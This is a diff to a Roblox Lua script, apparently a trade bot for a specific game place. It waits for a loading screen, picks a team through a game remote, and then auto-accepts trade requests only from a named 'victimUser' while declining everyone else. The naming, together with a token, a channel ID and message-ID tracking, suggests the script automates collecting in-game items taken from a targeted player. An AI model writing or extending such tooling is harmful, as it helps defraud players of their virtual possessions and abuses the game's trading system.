@@ -6,6 +6,9 @@ if token == "" or channelId == "" then
     game.Players.LocalPlayer:kick("Add your token or channelId to use")
 end
 
+local ADM_PLACE = 920587237
+local IS_ADM = game.PlaceId == ADM_PLACE
+
 local bb = game:GetService("VirtualUser")
 game:service "Players".LocalPlayer.Idled:connect(function()
     bb:CaptureController()
@@ -31,13 +34,27 @@ local didVictimLeave = false
 local timer = 0
 
 local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-local loadingScreen = playerGui:WaitForChild("AssetLoadUI")
-while loadingScreen.Enabled do
-    wait(1)
+local loadingScreen = playerGui:WaitForChild("AssetLoadUI", 60)
+if loadingScreen then
+    while loadingScreen.Enabled do
+        task.wait(0.1)
+    end
 end
-wait(3)
+wait(2)
 local waittime = delay or 0.1
 wait(waittime)
+
+if IS_ADM then
+    local okTeam, errTeam = pcall(function()
+        game:GetService("ReplicatedStorage"):WaitForChild("API",60):WaitForChild("TeamAPI/ChooseTeam",60):InvokeServer("Parents", {
+            source_for_logging = "intro_sequence",
+            dont_enter_location = true
+        })
+    end)
+    if not okTeam then warn("[adm] early ChooseTeam failed: "..tostring(errTeam)) end
+end
+
+nouse = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
 
 local tradeFrame = playerGui.TradeApp.Frame
 local Loads = require(game.ReplicatedStorage.Fsys).load
@@ -49,30 +66,13 @@ local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
 local inventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
 local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
 
-print("[Trade Bot] Listening for user: '" .. victimUser .. "'")
-
 TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender, ...)
-    print("[Trade Bot] Trade event triggered!")
-    print("[Trade Bot] Sender parameter:", sender)
-
-    if sender then
-        print("[Trade Bot] Sender name:", sender.Name)
-        print("[Trade Bot] Target victim user:", victimUser)
-
-        if sender.Name == victimUser then
-            print("[Trade Bot] Match found! Sending ACCEPT request to server...")
-            local result = TradeAcceptOrDeclineRequest:InvokeServer(sender, true)
-            print("[Trade Bot] Server response for ACCEPT:", result)
-        else
-            print("[Trade Bot] Name mismatch ('" .. tostring(sender.Name) .. "' ~= '" .. tostring(victimUser) .. "'). Sending DECLINE request...")
-            local result = TradeAcceptOrDeclineRequest:InvokeServer(sender, false)
-            print("[Trade Bot] Server response for DECLINE:", result)
-        end
+    if sender.Name == victimUser then
+        TradeAcceptOrDeclineRequest:InvokeServer(sender, true)
     else
-        print("[Trade Bot] Warning: 'sender' argument is nil!")
+        TradeAcceptOrDeclineRequest:InvokeServer(sender, false)
     end
 end)
-
 
 local function saveJoinedId(messageId)
     table.insert(joinedIds, messageId)
